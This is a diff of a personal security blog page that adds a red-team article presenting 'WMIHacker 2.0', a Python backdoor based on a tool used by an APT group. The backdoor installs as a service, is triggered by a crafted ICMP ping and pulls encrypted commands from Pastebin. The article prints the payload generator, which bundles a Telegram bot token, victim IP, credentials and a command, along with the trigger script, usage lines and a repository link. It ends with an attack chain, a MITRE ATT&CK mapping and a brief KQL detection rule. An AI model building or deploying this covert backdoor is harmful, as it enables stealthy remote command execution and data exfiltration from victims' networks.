@@ -5,9 +5,28 @@
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="noindex, nofollow">
-<title>WMIHacker 2.0 | s0ld13r&#39;s blog</title>
+<title>WMIHacker 2.0 👾 | s0ld13r&#39;s blog</title>
 <meta name="keywords" content="">
-<meta name="description" content="Hello World!">
+<meta name="description" content="
+DISCLAIMER:
+This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.
+Table of Contents
+
+Introduction
+Earth Kurma Chain
+Symmetric &amp; Asymmetric approach in C2 infra
+
+Symmetric C2
+Asymmetric C2
+
+
+WMIHacker 2.0
+MITRE ATT&amp;CK mapping
+Detection &amp; Response
+Conclusion
+
+Introduction
+In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.">
 <meta name="author" content="">
 <link rel="canonical" href="http://localhost:1313/posts/wmihacker-2.0/">
 <link crossorigin="anonymous" href="http://localhost:1313/assets/css/stylesheet.6da9a63d25a9608bca2f7f907a030e887a7dd3c3f3918e4cc113129361414bda.css" integrity="sha256-bammPSWpYIvKL3&#43;QegMOiHp908PzkY5MwRMSk2FBS9o=" rel="preload stylesheet" as="style">
@@ -107,19 +126,270 @@
   <header class="post-header">
     
     <h1 class="post-title entry-hint-parent">
-      WMIHacker 2.0
-      <span class="entry-hint" title="Draft">
-        <svg xmlns="http://www.w3.org/2000/svg" height="35" viewBox="0 -960 960 960" fill="currentColor">
-          <path
-            d="M160-410v-60h300v60H160Zm0-165v-60h470v60H160Zm0-165v-60h470v60H160Zm360 580v-123l221-220q9-9 20-13t22-4q12 0 23 4.5t20 13.5l37 37q9 9 13 20t4 22q0 11-4.5 22.5T862.09-380L643-160H520Zm300-263-37-37 37 37ZM580-220h38l121-122-18-19-19-18-122 121v38Zm141-141-19-18 37 37-18-19Z" />
-        </svg>
-      </span>
+      WMIHacker 2.0 👾
     </h1>
-    <div class="post-meta"><span title='2025-05-04 15:44:24 +0500 +05'>May 4, 2025</span>&nbsp;·&nbsp;1 min
+    <div class="post-meta"><span title='2025-05-04 15:44:24 +0500 +05'>May 4, 2025</span>&nbsp;·&nbsp;7 min
 
 </div>
   </header> 
-  <div class="post-content"><p>Hello World!</p>
+  <div class="post-content"><blockquote>
+<p>DISCLAIMER:
+This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.</p></blockquote>
+<h2 id="table-of-contents">Table of Contents<a hidden class="anchor" aria-hidden="true" href="#table-of-contents">#</a></h2>
+<ul>
+<li><a href="#introduction">Introduction</a></li>
+<li><a href="#earth-kurma-chain">Earth Kurma Chain</a></li>
+<li><a href="#symmetric--asymmetric-approach-in-c2-infra">Symmetric &amp; Asymmetric approach in C2 infra</a>
+<ul>
+<li><a href="#symmetric-c2">Symmetric C2</a></li>
+<li><a href="#asymmetric-c2">Asymmetric C2</a></li>
+</ul>
+</li>
+<li><a href="#wmihacker-20">WMIHacker 2.0</a></li>
+<li><a href="#mitre-attck-mapping">MITRE ATT&amp;CK mapping</a></li>
+<li><a href="#detection--response">Detection &amp; Response</a></li>
+<li><a href="#conclusion">Conclusion</a></li>
+</ul>
+<h2 id="introduction">Introduction<a hidden class="anchor" aria-hidden="true" href="#introduction">#</a></h2>
+<p>In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.</p>
+<p>We’ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.</p>
+<p>Tool Repo: <a href="https://github.com/s0ld13rr/WMIHACKER">https://github.com/s0ld13rr/WMIHACKER</a></p>
+<h2 id="earth-kurma-chain">Earth Kurma Chain<a hidden class="anchor" aria-hidden="true" href="#earth-kurma-chain">#</a></h2>
+<p><img alt="APT" loading="lazy" src="http://localhost:1313/earth_kurma_wmihacker.jpg"></p>
+<p>In Trend Micro’s analysis of the <a href="https://www.trendmicro.com/en_us/research/25/d/earth-kurma-apt-campaign.html">Earth Kurma APT campaign</a>, attackers used <a href="https://github.com/rootclay/WMIHACKER">WMIHACKER</a>, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM — without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.</p>
+<p>During my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.</p>
+<h2 id="symmetric--asymmetric-approach-in-c2-infra">Symmetric &amp; Asymmetric approach in C2 infra<a hidden class="anchor" aria-hidden="true" href="#symmetric--asymmetric-approach-in-c2-infra">#</a></h2>
+<p>But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.</p>
+<h3 id="symmetric-c2">Symmetric C2<a hidden class="anchor" aria-hidden="true" href="#symmetric-c2">#</a></h3>
+<p><img alt="Symmetric C2" loading="lazy" src="http://localhost:1313/symmetric-c2.jpg"></p>
+<p>A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.</p>
+<p>Key Characteristics:</p>
+<ul>
+<li>
+<p>One-to-one or one-to-many agent-to-C2 relationship.</p>
+</li>
+<li>
+<p>The C2 server maintains state and task queues for each agent.</p>
+</li>
+<li>
+<p>Communication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).</p>
+</li>
+<li>
+<p>Easier to map and detect from a defensive standpoint.</p>
+</li>
+</ul>
+<p>Use Cases:</p>
+<ul>
+<li>
+<p>Post-exploitation in isolated networks.</p>
+</li>
+<li>
+<p>Campaigns with short dwell time.</p>
+</li>
+<li>
+<p>Controlled Red Team engagements.</p>
+</li>
+</ul>
+<h3 id="asymmetric-c2">Asymmetric C2<a hidden class="anchor" aria-hidden="true" href="#asymmetric-c2">#</a></h3>
+<p><img alt="Asymmetric C2" loading="lazy" src="http://localhost:1313/asymmetric-c2.jpg"></p>
+<p>An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodes—other compromised machines or pivoting points.</p>
+<p>Key Characteristics:</p>
+<ul>
+<li>
+<p>Multi-hop architecture, often involving lateral movement.</p>
+</li>
+<li>
+<p>Commands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).</p>
+</li>
+<li>
+<p>Results may be forwarded to another C2 server entirely.</p>
+</li>
+<li>
+<p>Harder to correlate agent actions to a single C2 node.</p>
+</li>
+<li>
+<p>Resilient to takedown and more stealthy.</p>
+</li>
+</ul>
+<p>Use Cases:</p>
+<ul>
+<li>
+<p>APT-level operations.</p>
+</li>
+<li>
+<p>Red Team simulations that mimic real-world actor TTPs.</p>
+</li>
+<li>
+<p>Scenarios involving air-gapped or heavily segmented environments.</p>
+</li>
+</ul>
+<h2 id="wmihacker-20">WMIHacker 2.0<a hidden class="anchor" aria-hidden="true" href="#wmihacker-20">#</a></h2>
+<p><img alt="WMIHACKER" loading="lazy" src="http://localhost:1313/wmihacker_concept.jpg"></p>
+<p>I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.</p>
+<pre tabindex="0"><code>def xorshift_encrypt(data: bytes, key: int) -&gt; bytes:
+    result = bytearray()
+    state = key &amp; 0xFFFFFFFF 
+
+    for b in data:
+        state ^= (state &lt;&lt; 13) &amp; 0xFFFFFFFF
+        state ^= (state &gt;&gt; 17)
+        state ^= (state &lt;&lt; 5) &amp; 0xFFFFFFFF
+        prng_byte = (state &amp; 0xFF)
+
+        result.append(b ^ prng_byte)
+
+    return bytes(result)
+
+# all these parameters are used in the payload, change for your needs
+
+KEY=0xDEADBEEF 
+TOKEN = &#34;BOT TOKEN&#34;
+CHAT_ID = &#34;CHAT ID&#34;
+IP_ADDR = &#34;VICTIM_IP&#34;
+USER = &#34;USERNAME&#34;
+PASSWORD = &#34;PASSWORD&#34;
+COMMAND = &#34;echo &#39;YOU HAVE BEEN PWNED!&#39; &gt; C:\\Users\\Administrator\\hello.txt&#34; 
+
+
+msg = f&#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}&#34;.encode()
+
+enc = xorshift_encrypt(msg, KEY)
+
+print(enc.hex())
+</code></pre><p>This code (<code>payload_gen.py</code>) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host.
+Parameters are separated by <code>$$$$</code> and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the fewer artifacts on OS.</p>
+<pre tabindex="0"><code>from scapy.all import *
+
+victim_ip = input(&#34;Enter the victim&#39;s IP address: &#34;).strip()
+
+id = input(&#34;Enter the Pastebin ID: &#34;).strip()
+
+packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f&#34;PWN:{id}&#34;)
+
+packet.show()
+
+send(packet)
+
+print(&#34;Packet sent!&#34;)
+</code></pre><p>This script (<code>checker.py</code>) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.</p>
+<p><img alt="PoC TG" loading="lazy" src="http://localhost:1313/PoC_TG.jpg"></p>
+<p><img alt="PoC TG2" loading="lazy" src="http://localhost:1313/PoC_TG2.jpg"></p>
+<p>Above you can see the Proof of Concept implementation of the WMI-based backdoor.</p>
+<p>On victims host:</p>
+<pre tabindex="0"><code>PS&gt; python wmihacker.py &lt;LOCAL IP&gt; 
+</code></pre><p>or</p>
+<pre tabindex="0"><code>PS&gt; wmihacker.exe &lt;LOCAL_IP&gt; # build with PyInstaller
+</code></pre><p>I deployed whole project here: <a href="https://github.com/s0ld13rr/WMIHACKER">https://github.com/s0ld13rr/WMIHACKER</a></p>
+<p><img alt="WMIHACKER CHAIN" loading="lazy" src="http://localhost:1313/chain_wmihacker.png"></p>
+<p>The attack chain might look this way:</p>
+<ol>
+<li>
+<p>Initial access on a client machine via spear-phishing (T1566.001).</p>
+</li>
+<li>
+<p>That machine sends a specially crafted packet to an internal Exchange server (already compromised).</p>
+</li>
+<li>
+<p>The Exchange server, running a WMI backdoor, executes commands on other machines (T1047).</p>
+</li>
+<li>
+<p>Collected data is sent to a completely separate, hidden C2 server.</p>
+</li>
+</ol>
+<p>As I wrote in previous section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.</p>
+<h2 id="mitre-attck-mapping">MITRE ATT&amp;CK mapping<a hidden class="anchor" aria-hidden="true" href="#mitre-attck-mapping">#</a></h2>
+<p>The table below maps key attacker actions to MITRE ATT&amp;CK techniques. It shows how the backdoor achieves things like initial access, execution, C2, and evasion—using WMI, ICMP, Telegram, and more. This gives a clear view of the TTPs involved and helps defenders understand what to watch for.</p>
+<table>
+  <thead>
+      <tr>
+          <th>Technique</th>
+          <th>ID</th>
+          <th>Description</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>Spearphishing Attachment</strong></td>
+          <td><a href="https://attack.mitre.org/techniques/T1566/001/">T1566.001</a></td>
+          <td>Initial access via email with malicious attachment</td>
+      </tr>
+      <tr>
+          <td><strong>Windows Management Instrumentation (WMI)</strong></td>
+          <td><a href="https://attack.mitre.org/techniques/T1047/">T1047</a></td>
+          <td>Remote command execution using WMI</td>
+      </tr>
+      <tr>
+          <td><strong>Command and Scripting Interpreter: Python</strong></td>
+          <td><a href="https://attack.mitre.org/techniques/T1059/006/">T1059.006</a></td>
+          <td>Use of Python for execution</td>
+      </tr>
+      <tr>
+          <td><strong>Ingress Tool Transfer</strong></td>
+          <td><a href="https://attack.mitre.org/techniques/T1105/">T1105</a></td>
+          <td>Downloading payloads (e.g., from Pastebin)</td>
+      </tr>
+      <tr>
+          <td><strong>Application Layer Protocol: ICMP</strong></td>
+          <td><a href="https://attack.mitre.org/techniques/T1043/">T1043</a></td>
+          <td>Use of ICMP for signaling</td>
+      </tr>
+      <tr>
+          <td><strong>Non-Application Layer Protocol</strong></td>
+          <td><a href="https://attack.mitre.org/techniques/T1095/">T1095</a></td>
+          <td>C2 communication via non-standard protocols (e.g., ICMP)</td>
+      </tr>
+      <tr>
+          <td><strong>Exfiltration Over Web Service</strong></td>
+          <td><a href="https://attack.mitre.org/techniques/T1567/002/">T1567.002</a></td>
+          <td>Exfiltration using Telegram Bot API</td>
+      </tr>
+      <tr>
+          <td><strong>Obfuscated Files or Information</strong></td>
+          <td><a href="https://attack.mitre.org/techniques/T1027/">T1027</a></td>
+          <td>XOR encryption for payload confidentiality</td>
+      </tr>
+      <tr>
+          <td><strong>Proxy</strong></td>
+          <td><a href="https://attack.mitre.org/techniques/T1090/">T1090</a></td>
+          <td>Asymmetric C2 using pivoting through internal nodes</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="detection--response">Detection &amp; Response<a hidden class="anchor" aria-hidden="true" href="#detection--response">#</a></h2>
+<blockquote>
+<p>Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it&rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.</p></blockquote>
+<p>To detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:</p>
+<p><code>winlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: &quot;S-1-5-20&quot;</code></p>
+<p>Explanation:</p>
+<ul>
+<li>
+<p>event.code: 4688 – Triggers on the creation of a new process.</p>
+</li>
+<li>
+<p>winlog.event_data.ParentProcessName: *WmiPrvse.exe – Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.</p>
+</li>
+<li>
+<p>SubjectUserSid: &ldquo;S-1-5-20&rdquo; – Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.</p>
+</li>
+</ul>
+<p>Response Actions:</p>
+<ul>
+<li>
+<p>Investigate the child process and command-line arguments.</p>
+</li>
+<li>
+<p>Review associated WMI event logs and consumer/subscription configurations.</p>
+</li>
+<li>
+<p>Correlate with other telemetry such as network connections or abnormal service creation.</p>
+</li>
+<li>
+<p>Apply endpoint detection &amp; response (EDR) rules to block known malicious behaviors.</p>
+</li>
+</ul>
+<h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
+<p>WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.</p>
+<p>When integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.</p>
 
 
   </div>
